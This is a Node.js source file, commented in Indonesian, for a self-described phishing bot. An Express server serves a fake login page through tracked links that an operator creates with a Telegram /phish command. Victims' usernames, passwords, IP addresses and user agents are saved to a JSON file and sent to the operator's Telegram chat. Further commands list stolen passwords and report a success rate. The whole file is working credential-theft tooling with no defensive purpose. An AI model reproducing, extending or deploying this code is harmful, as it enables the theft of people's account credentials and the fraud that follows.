
// ===========================================
// SERVER UTAMA - PHISHING BOT
// SEMUA FILE DI ROOT, TANPA FOLDER
// BUATAN: HERIKEYZENLOCKER
// DARI: LAMPUNG SELATAN - BANJARAN SUDOM
// ===========================================

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');

// Load environment variables
dotenv.config();

// ===========================================
// KONFIGURASI
// ===========================================
const BOT_TOKEN = process.env.BOT_TOKEN || '1234567890:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw';
const TUAN_GUA_ID = process.env.TUAN_GUA_ID || '123456789';
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.DOMAIN || `http://localhost:${PORT}`;

// Inisialisasi
const app = express();
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Semua file di root bisa diakses

// ===========================================
// DATABASE SEDERHANA (PAKE FILE)
// ===========================================
const DATA_FILE = './data.json';

// Inisialisasi file database
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify({ victims: [], links: [] }, null, 2));
}

function readDB() {
    try {
        return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    } catch {
        return { victims: [], links: [] };
    }
}

function writeDB(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// ===========================================
// BOT TELEGRAM - HANDLER
// ===========================================

// /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId,
        `🔥 *PHISHING BOT V3.0* 🔥\n\n` +
        `Dibuat oleh *HERIKEYZENLOCKER*\n` +
        `Dari *LAMPUNG SELATAN - BANJARAN SUDOM*\n\n` +
        `📋 *DAFTAR PERINTAH:*\n` +
        `/phish [url] - Buat link phishing\n` +
        `/data - Lihat data korban\n` +
        `/stats - Statistik\n` +
        `/help - Bantuan`,
        { parse_mode: 'Markdown' }
    );
});

// /help
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id,
        `🔰 *BANTUAN* 🔰\n\n` +
        `Cara pakai:\n` +
        `1. Ketik /phish https://instagram.com\n` +
        `2. Bot kasih link: ${DOMAIN}/login.html?id=xxx\n` +
        `3. Kirim link ke target\n` +
        `4. Target masukin data\n` +
        `5. Data masuk ke bot`,
        { parse_mode: 'Markdown' }
    );
});

// /phish
bot.onText(/\/phish (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const targetUrl = match[1];
    
    if (userId !== TUAN_GUA_ID) {
        bot.sendMessage(chatId, '❌ Hanya Tuan Gua yang bisa!');
        return;
    }
    
    // Generate ID unik
    const linkId = Math.random().toString(36).substring(7) + Date.now().toString(36);
    const phishLink = `${DOMAIN}/login.html?id=${linkId}`;
    
    // Simpan ke database
    const db = readDB();
    db.links.push({
        id: linkId,
        target: targetUrl,
        creator: userId,
        createdAt: new Date().toISOString(),
        visited: false
    });
    writeDB(db);
    
    bot.sendMessage(chatId,
        `✅ *LINK PHISHING SIAP!*\n\n` +
        `🎯 Target: ${targetUrl}\n` +
        `🔗 Link: \`${phishLink}\`\n\n` +
        `📋 Kirim link ini ke target.`,
        { parse_mode: 'Markdown' }
    );
});

// /data
bot.onText(/\/data/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    
    if (userId !== TUAN_GUA_ID) return;
    
    const db = readDB();
    const victims = db.victims;
    
    if (victims.length === 0) {
        bot.sendMessage(chatId, '📭 Belum ada data.');
        return;
    }
    
    let message = `📊 *DATA KORBAN*\n\n`;
    victims.slice(-10).forEach((v, i) => {
        message += `${i+1}. *${v.username || 'Unknown'}*\n`;
        message += `   🔑 Password: \`${v.password}\`\n`;
        message += `   🕐 ${new Date(v.timestamp).toLocaleString('id-ID')}\n\n`;
    });
    
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// /stats
bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    
    if (userId !== TUAN_GUA_ID) return;
    
    const db = readDB();
    const totalLinks = db.links.length;
    const totalVictims = db.victims.length;
    const visitedLinks = db.links.filter(l => l.visited).length;
    
    bot.sendMessage(chatId,
        `📈 *STATISTIK*\n\n` +
        `• Total link: ${totalLinks}\n` +
        `• Link diklik: ${visitedLinks}\n` +
        `• Korban: ${totalVictims}\n` +
        `• Sukses rate: ${totalLinks ? ((visitedLinks/totalLinks)*100).toFixed(1) : 0}%`,
        { parse_mode: 'Markdown' }
    );
});

// ===========================================
// WEB SERVER - ROUTES
// ===========================================

// Halaman utama
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Halaman login (phishing)
app.get('/login.html', (req, res) => {
    const id = req.query.id;
    if (!id) {
        return res.redirect('/');
    }
    
    // Baca file login.html
    let html = fs.readFileSync('./login.html', 'utf8');
    
    // Kirim
    res.send(html);
});

// Proses login (data masuk)
app.post('/login', (req, res) => {
    const { username, password, linkId } = req.body;
    
    // Simpan data
    const db = readDB();
    
    // Update link status
    const linkIndex = db.links.findIndex(l => l.id === linkId);
    if (linkIndex !== -1) {
        db.links[linkIndex].visited = true;
        db.links[linkIndex].visitedAt = new Date().toISOString();
    }
    
    // Simpan korban
    db.victims.push({
        username,
        password,
        linkId,
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        timestamp: new Date().toISOString()
    });
    
    writeDB(db);
    
    // Kirim notifikasi ke Telegram
    bot.sendMessage(TUAN_GUA_ID,
        `✅ *DATA KORBAN MASUK!*\n\n` +
        `👤 Username: ${username}\n` +
        `🔑 Password: \`${password}\`\n` +
        `🆔 Link ID: ${linkId}\n` +
        `🕐 Waktu: ${new Date().toLocaleString('id-ID')}`,
        { parse_mode: 'Markdown' }
    );
    
    res.redirect('/success.html');
});

// Halaman sukses
app.get('/success.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'success.html'));
});

// ===========================================
// JALANKAN SERVER
// ===========================================
app.listen(PORT, () => {
    console.log('='.repeat(50));
    console.log('🔥 PHISHING BOT V3.0 🔥');
    console.log('='.repeat(50));
    console.log(`👤 Pembuat: HERIKEYZENLOCKER`);
    console.log(`🏡 Asal: Lampung Selatan - Banjaran Sudom`);
    console.log(`🌐 Web: ${DOMAIN}`);
    console.log(`🤖 Bot: Running`);
    console.log('='.repeat(50));
});

console.log('✅ Bot Telegram siap!');
